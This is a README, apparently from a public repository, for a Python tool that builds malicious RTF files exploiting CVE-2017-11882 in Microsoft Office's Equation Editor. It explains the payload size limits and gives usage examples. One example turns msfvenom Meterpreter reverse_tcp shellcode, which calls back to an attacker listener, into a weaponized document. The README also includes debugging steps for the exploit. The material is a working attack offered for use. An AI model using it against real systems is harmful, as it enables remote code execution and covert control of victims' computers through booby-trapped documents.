# CVE-2017-11882 Exploit

CVE-2017-11882 Exploit accepts 605 bytes long command/code in maximum.

For remote command execution,this exploit will call WinExec with SW_HIDE and call ExitProcess after WinExec returns.

For remote code execution,this exploit just jmp to code.

I cannot find a reference for the object structure...so I cannot change the file length for arbitrary length code execution..:(

Actually there exists a way to enlarge the payload size. Just add more chars in Equation Editor and use that file as template.

If you do this your exploit rtf will be larger, and I do think 605 bytes is enough for exploitation because the meterpreter payload have only 333 bytes long.

## Usage
```
usage: CVE-2017-11882.py [-h] -c CMD [-t TYPE] -o OUTPUT

Exploit for CVE-2017-11882 @unamer(https://github.com/unamer/CVE-2017-11882)

optional arguments:
  -h, --help            show this help message and exit
  -c CMD, --cmd CMD     Command or shellcode file to run in target system
                        (Must be shorter than 605 bytes!!)
  -t TYPE, --type TYPE  Type (0:shellcode 1:command, default=1)
  -o OUTPUT, --output OUTPUT
                        Output exploit rtf
```

Example:

For remote command execution
```
CVE-2017-11882.py -c cmd.exe -o test.rtf
```

For remote code execution

1. Generate some shellcode

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.115 LPORT=2333 -o ./sc.bin
```

2. Generate exploit
```
CVE-2017-11882.py -c sc.bin -t 0 -o test.rtf
```
## Debug

 1. Set debugger value to your debugger path in HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\EQNEDT32.EXE

 2. Build an exploit and run it.
 
 3. Set break point at 0x41165f
 
 4. This break point will be hit twice, at second time the payload will be executed after this function returned.
